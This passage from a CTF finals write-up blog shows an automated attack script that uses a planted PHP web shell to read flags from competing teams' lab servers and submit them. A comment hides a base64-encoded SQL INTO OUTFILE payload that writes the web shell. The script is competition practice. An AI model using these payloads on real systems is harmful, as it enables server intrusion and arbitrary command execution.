<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line"><span class="comment"># Submission server</span></span><br><span class="line">SUBMIT_HOST = <span class="string">&quot;10.10.100.10&quot;</span></span><br><span class="line">SUBMIT_PORT = <span class="number">6666</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Teams to exploit</span></span><br><span class="line">TEAMS = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interval in seconds (2 minutes)</span></span><br><span class="line">INTERVAL = <span class="number">120</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit_team</span>(<span class="params">team</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Exploit a single team and return their flag&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = <span class="string">f&quot;http://10.10.<span class="subst">&#123;team&#125;</span>.10:5555&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># thanks to daus lmao http://httpbin.org/base64/U0VMRUNUICc8P3BocCBpZihpc3NldCgkX0dFVFtcJ2NcJ10pKXtzeXN0ZW0oJF9HRVRbXCdjXCddKTt9ID8+JyBJTlRPIE9VVEZJTEUgJy92YXIvd3d3L2h0bWwvcy5waHAnOw==</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;      [+] Readibidng flag...&quot;</span>)</span><br><span class="line">        flag_url = <span class="string">f&quot;<span class="subst">&#123;target&#125;</span>/skibidi.php?c=cat /home/user/flag.txt&quot;</span></span><br><span class="line"></span><br><span class="line">        response = requests.get(flag_url, timeout=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Extract flag from response</span></span><br><span class="line">        flags = re.findall(<span class="string">r&#x27;SIBER25_[A-Za-z0-9+/=]+&#x27;</span>, response.text)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> flags:</span><br><span class="line">            flag = flags[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;      [✓] Team <span class="subst">&#123;team&#125;</span>: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> flag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;      [-] Team <span class="subst">&#123;team&#125;</span>: No flag found in response&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;      [-] Team <span class="subst">&#123;team&#125;</span>: Error - <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">submit_flags</span>(<span class="params">flags</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Submit flags to the server&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> flags:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  [-] No flags to submit!&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [*] Connecting to <span class="subst">&#123;SUBMIT_HOST&#125;</span>:<span class="subst">&#123;SUBMIT_PORT&#125;</span>...&quot;</span>)</span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">10</span>)</span><br><span class="line">        sock.connect((SUBMIT_HOST, SUBMIT_PORT))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Read banner</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            banner = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;banner.strip()&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;  [*] Submitting flags...\n&quot;</span>)</span><br><span class="line">        <span class="keyword">for</span> flag <span class="keyword">in</span> flags:</span><br><span class="line">            sock.sendall(flag.encode() + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                response = sock.recv(<span class="number">4096</span>).decode()</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;flag&#125;</span> -&gt; <span class="subst">&#123;response.strip()&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;  <span class="subst">&#123;flag&#125;</span> -&gt; No response&quot;</span>)</span><br><span class="line"></span><br><span class="line">        sock.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  [-] Error submitting: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Automated CTF Flag Exploiter - Running every 2 minutes&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Press Ctrl+C to stop\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">    iteration = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            timestamp = datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[Iteration <span class="subst">&#123;iteration&#125;</span>] - <span class="subst">&#123;timestamp&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Exploiting all teams...&quot;</span>)</span><br><span class="line">            flags = []</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> team <span class="keyword">in</span> TEAMS:</span><br><span class="line">                flag = exploit_team(team)</span><br><span class="line">                <span class="keyword">if</span> flag:</span><br><span class="line">                    flags.append(flag)</span><br><span class="line">                time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Successfully extracted <span class="subst">&#123;<span class="built_in">len</span>(flags)&#125;</span> flags&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> flags:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[*] Submitting flags to server...&quot;</span>)</span><br><span class="line">                submit_flags(flags)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;\n[-] No flags to submit!&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[*] Waiting 2 minutes until next run...&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">70</span>)</span><br><span class="line"></span><br><span class="line">            time.sleep(INTERVAL)</span><br><span class="line">            iteration += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;\n\n[!] Stopped by user&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;\n[-] Error in main loop: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] Retrying in 2 minutes...&quot;</span>)</span><br><span class="line">            time.sleep(INTERVAL)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>megat</span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="https://ilikeronnnnii.github.io/2025/10/18/sibersiaga25finals/">https://ilikeronnnnii.github.io/2025/10/18/sibersiaga25finals/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>peepo pog</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2026/01/01/nextjs/">NextJS v14.1.0 CurtinCTF</a>
            
            
            <a class="next" rel="next" href="/2025/10/18/sibersiaga25quals/">SiberSiaga 2025</a>
            
        </section>


    </article>
</div>

            </div>
            <!-- if youre feeling like a stupid chungus loser today i want you to know that i think youre lowkirkenuinly the 6 to my 7 -->

    </div>
</body>

</html>